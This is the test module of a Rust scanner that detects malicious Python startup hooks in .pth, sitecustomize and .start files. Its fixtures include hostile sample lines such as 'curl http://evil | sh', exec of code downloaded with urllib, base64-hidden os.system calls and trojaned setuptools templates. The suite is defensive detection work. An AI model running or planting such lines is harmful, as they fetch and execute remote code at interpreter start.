    fn cross_runtime_requires_runtime_name_and_spawn() {
        let caps = scan_capabilities("import subprocess; subprocess.Popen(['bun', 'run', 'x.js'])");
        assert!(caps.cross_runtime, "bun + subprocess is cross-runtime");
        // node, deno too.
        assert!(scan_capabilities("import os; os.system('node /tmp/_index.js')").cross_runtime);
        assert!(
            scan_capabilities("import subprocess; subprocess.run(['deno','run','x'])")
                .cross_runtime
        );
        // A bare mention of `node` with NO spawn is not cross-runtime.
        assert!(!scan_capabilities("import nodeenv  # sets up node").cross_runtime);
    }

    #[test]
    fn cross_runtime_does_not_fire_on_substring() {
        // "node" inside "nodeenv" must not trip the runtime token (word boundary).
        let caps = scan_capabilities("import subprocess; subprocess.run(['nodeenv'])");
        assert!(
            !caps.cross_runtime,
            "the runtime token must be word-bounded, not a substring of nodeenv"
        );
    }

    #[test]
    fn base64_obfuscated_body_is_flagged() {
        use base64::Engine as _;
        // `import os; os.system('id')` hidden in a base64 blob and exec'd.
        let inner = "os.system('id')";
        let encoded = base64::engine::general_purpose::STANDARD.encode(inner);
        let body = format!("import base64; exec(base64.b64decode('{encoded}'))");
        let caps = scan_capabilities(&body);
        // The raw body already shows `exec(` and `base64.b64decode` (dynamic exec),
        // and the DECODED form shows `os.system` (subprocess) which the raw body
        // did not — so it is obfuscated.
        assert!(caps.dynamic_exec);
        assert!(caps.subprocess, "decoded os.system must surface");
        assert!(caps.obfuscated, "a capability only in the decoded form");
    }

    // ---- benign templates -----------------------------------------------------

    #[test]
    fn distutils_precedence_template_is_benign() {
        let line = "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim()";
        assert!(is_benign_template(line), "the distutils shim is benign");
    }

    #[test]
    fn editable_finder_template_is_benign() {
        let line =
            "import __editable___demo_1_0_0_finder; __editable___demo_1_0_0_finder.install()";
        assert!(is_benign_template(line));
    }

    #[test]
    fn namespace_pkg_template_is_benign() {
        // A representative setuptools -nspkg.pth one-liner.
        let line = "import sys, types, os; has_mfs = sys.version_info > (3, 5); p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('ns',)); importlib = has_mfs and __import__('importlib.util'); has_mfs and __import__('importlib.machinery'); m = has_mfs and sys.modules.setdefault('ns', types.ModuleType('ns')); m = m or sys.modules.setdefault('ns', types.ModuleType('ns'))";
        assert!(
            is_benign_template(line),
            "a canonical namespace bootstrap is benign"
        );
    }

    /// A line matching the distutils template SHAPE but carrying a payload
    /// (subprocess/network/cross-runtime) is NOT benign: the capability scan
    /// disqualifies it, so the hook still fires (closes the template-bypass hole).
    #[test]
    fn trojaned_distutils_template_is_not_benign() {
        let trojan =
            "import os; os.system('curl http://evil | sh'); __import__('_distutils_hack').add_shim()";
        assert!(
            !is_benign_template(trojan),
            "a distutils shim carrying a subprocess payload must not be benign"
        );
        // The canonical (payload-free) shim is still recognized as benign.
        let canonical = "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim()";
        assert!(is_benign_template(canonical));
    }

    #[test]
    fn injected_dynamic_exec_breaks_benign_template() {
        // `exec(`/`eval(`/`compile(` sandwiched between a template's prefix and suffix
        // is a trojaned payload. The `__import__` the templates legitimately use must
        // NOT be what gates them, or the hook is fully evasible (Greptile).
        let distutils_exec =
            "import os; exec(open('/tmp/stage2').read()); __import__('_distutils_hack').add_shim()";
        assert!(
            !is_benign_template(distutils_exec),
            "a distutils shim carrying exec() must not be benign"
        );
        let namespace_eval = "import sys, types, os; eval(compile('x','<s>','exec')); has_mfs = sys.version_info > (3, 5); importlib = has_mfs and __import__('importlib.util'); m = has_mfs and sys.modules.setdefault('ns', types.ModuleType('ns'))";
        assert!(
            !is_benign_template(namespace_eval),
            "a namespace bootstrap carrying eval()/compile() must not be benign"
        );
        // The canonical distutils + namespace templates legitimately use `__import__`
        // and must stay benign (no regression from the dynamic-exec guard).
        let canonical_distutils = "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim()";
        assert!(is_benign_template(canonical_distutils));
    }

    #[test]
    fn appended_statement_breaks_benign_label() {
        // The exact editable finder template PLUS a trailing malicious call: the
        // complete line no longer matches, so it is NOT benign.
        let tampered = "import __editable___demo_1_0_0_finder; __editable___demo_1_0_0_finder.install(); __import__('os').system('curl http://evil | sh')";
        assert!(
            !is_benign_template(tampered),
            "an appended statement must break the complete-line match"
        );
    }

    #[test]
    fn tampered_namespace_with_capability_is_not_benign() {
        // A namespace-shaped opening but carrying os.system: the danger-capability
        // defense-in-depth makes it non-benign even though the opening matches.
        let line = "import sys, types, os; m = types.ModuleType('x'); sys.modules['x'] = m; os.system('id')";
        assert!(!is_benign_template(line));
    }

    // ---- untrusted path additions ---------------------------------------------

    #[test]
    fn tmp_path_addition_is_untrusted() {
        assert!(is_untrusted_path("/tmp/attacker"));
        assert!(is_untrusted_path("/var/tmp/x"));
        assert!(is_untrusted_path("/dev/shm/y"));
        // Bare temp roots (no trailing slash) are untrusted too.
        assert!(is_untrusted_path("/dev/shm"));
        assert!(is_untrusted_path("/private/tmp"));
    }

    #[test]
    fn traversal_and_unc_paths_are_untrusted() {
        assert!(is_untrusted_path("../../etc"));
        assert!(is_untrusted_path("a/../../b"));
        assert!(is_untrusted_path("\\\\host\\share"));
        assert!(is_untrusted_path("//host/share"));
    }

    #[test]
    fn ordinary_relative_path_is_trusted() {
        assert!(!is_untrusted_path("src"));
        assert!(!is_untrusted_path("./mypkg"));
        assert!(!is_untrusted_path("lib/python3.11/site-packages/extra"));
    }

    // ---- analyze_body end-to-end ----------------------------------------------

    #[test]
    fn benign_editable_body_emits_no_executable_signal() {
        let body =
            "import __editable___demo_1_0_0_finder; __editable___demo_1_0_0_finder.install()\n";
        let analysis = analyze_body(body, &loc(), StartupHookKind::Pth);
        assert!(analysis.all_benign_templates);
        assert!(
            analysis.signals.is_empty(),
            "a benign editable .pth emits no signal; got {:?}",
            analysis.signals
        );
    }

    #[test]
    fn benign_namespace_body_emits_no_signal() {
        let body =
            "import sys, types, os; m = sys.modules.setdefault('ns', types.ModuleType('ns'))\n";
        let analysis = analyze_body(body, &loc(), StartupHookKind::Pth);
        assert!(analysis.all_benign_templates);
        assert!(analysis.signals.is_empty(), "got {:?}", analysis.signals);
    }

    #[test]
    fn os_system_body_fires_executable_and_subprocess() {
        let body = "import os; os.system('curl http://evil/x | sh')\n";
        let analysis = analyze_body(body, &loc(), StartupHookKind::Pth);
        assert!(!analysis.all_benign_templates);
        let kinds = distinct_kinds(&analysis.signals);
        assert!(kinds.contains(&ArtifactSignalKind::PthExecutableLine));
        assert!(kinds.contains(&ArtifactSignalKind::PthSubprocessSpawn));
        assert!(kinds.contains(&ArtifactSignalKind::PthNetworkDownload));
    }

    #[test]
    fn exec_urllib_body_fires_dynamic_and_network() {
        let body = "import urllib.request; exec(urllib.request.urlopen('http://x/p').read())\n";
        let analysis = analyze_body(body, &loc(), StartupHookKind::Pth);
        let kinds = distinct_kinds(&analysis.signals);
        assert!(kinds.contains(&ArtifactSignalKind::PthExecutableLine));
        assert!(kinds.contains(&ArtifactSignalKind::PthNetworkDownload));
        // exec( and sys.path search via importlib not here, but the network +
        // executable line carry the finding.
        assert!(analysis.capabilities.dynamic_exec);
    }

    #[test]
    fn base64_obfuscated_body_fires_obfuscation_signal() {
        use base64::Engine as _;
        let inner = "os.system('id')";
        let encoded = base64::engine::general_purpose::STANDARD.encode(inner);
        let body = format!("import base64; exec(base64.b64decode('{encoded}'))\n");
        let analysis = analyze_body(&body, &loc(), StartupHookKind::Pth);
        let kinds = distinct_kinds(&analysis.signals);
        assert!(kinds.contains(&ArtifactSignalKind::StartupHookObfuscated));
        assert!(kinds.contains(&ArtifactSignalKind::PthExecutableLine));
    }

    #[test]
    fn cross_runtime_body_carries_capability() {
        let body =
            "import subprocess; subprocess.Popen(['bun', 'run', '/tmp/payload/_index.js'])\n";
        let analysis = analyze_body(body, &loc(), StartupHookKind::Pth);
        assert!(
            analysis.capabilities.cross_runtime,
            "a Bun launch is the cross-runtime capability"
        );
        // The executable line + subprocess signals are present; correlation turns
        // cross_runtime into the Critical RuleId.
        let kinds = distinct_kinds(&analysis.signals);
        assert!(kinds.contains(&ArtifactSignalKind::PthExecutableLine));
        assert!(kinds.contains(&ArtifactSignalKind::PthSubprocessSpawn));
    }

    #[test]
    fn tmp_path_add_fires_untrusted_signal() {
        let body = "/tmp/attacker\nimport mypkg\n";
        let analysis = analyze_body(body, &loc(), StartupHookKind::Pth);
        let kinds = distinct_kinds(&analysis.signals);
        assert!(kinds.contains(&ArtifactSignalKind::PthUntrustedPathAddition));
    }

    #[test]
    fn sitecustomize_module_body_executes() {
        // A sitecustomize.py has no `import`-prefixed FIRST line necessarily; its
        // module code runs regardless. A module that spawns a shell must fire.
        let body = "import os\nos.system('curl http://evil | sh')\n";
        let analysis = analyze_body(body, &loc(), StartupHookKind::SiteCustomize);
        let kinds = distinct_kinds(&analysis.signals);
        assert!(
            kinds.contains(&ArtifactSignalKind::PthExecutableLine),
            "a sitecustomize module that executes must fire; got {kinds:?}"
        );
        assert!(kinds.contains(&ArtifactSignalKind::PthSubprocessSpawn));
    }

    #[test]
    fn dot_start_body_with_os_system_fires_subprocess_signal() {
        // A `.start` entry-point body whose callable runs `os.system(...)`. The
        // line is NOT `import `-prefixed, so the per-line classifier sees a
        // `PathAdd`; but a `.start` callable ALWAYS executes at interpreter start,
        // so the body must be analyzed as executing and its subprocess capability
        // must surface. Before the fix, `module_always_executes` covered only
        // SiteCustomize, so `body_executes` was false and the capability block was
        // skipped, leaving a `.start` with `os.system` silently clean.
        let body = "os.system(\"curl http://x\")\n";
        let analysis = analyze_body(body, &loc(), StartupHookKind::Start);
        let kinds = distinct_kinds(&analysis.signals);
        assert!(
            kinds.contains(&ArtifactSignalKind::PthSubprocessSpawn),
            "a .start body that spawns a subprocess must fire PthSubprocessSpawn; got {kinds:?}"
        );
        // The embedded http:// URL also makes it a network capability, and the
        // body-level executable signal records that the hook executes.
        assert!(kinds.contains(&ArtifactSignalKind::PthExecutableLine));
    }

    #[test]
    fn benign_sitecustomize_is_clean() {
        // A sitecustomize that only sets an encoding or a sys flag, no danger.
        let body = "import sys\nsys.dont_write_bytecode = True\n";
        let analysis = analyze_body(body, &loc(), StartupHookKind::SiteCustomize);
        assert!(
            !analysis.capabilities.has_danger(),
            "a benign sitecustomize has no danger capability"
        );
        assert!(
            !analysis
                .signals
                .iter()
                .any(|s| s.kind == ArtifactSignalKind::PthSubprocessSpawn
                    || s.kind == ArtifactSignalKind::PthNetworkDownload),
            "no danger signal for a benign sitecustomize; got {:?}",
            analysis.signals
        );
    }

    #[test]
    fn start_file_uses_entry_point_trigger() {
        assert_eq!(
            StartupHookKind::Start.trigger(),
            crate::artifact::ExecutionTrigger::PythonStartupEntryPoint
        );
        assert_eq!(
            StartupHookKind::Pth.trigger(),
            crate::artifact::ExecutionTrigger::PythonStartupPth
        );
        assert_eq!(
            StartupHookKind::SiteCustomize.trigger(),
            crate::artifact::ExecutionTrigger::PythonSiteCustomize
        );
    }
}
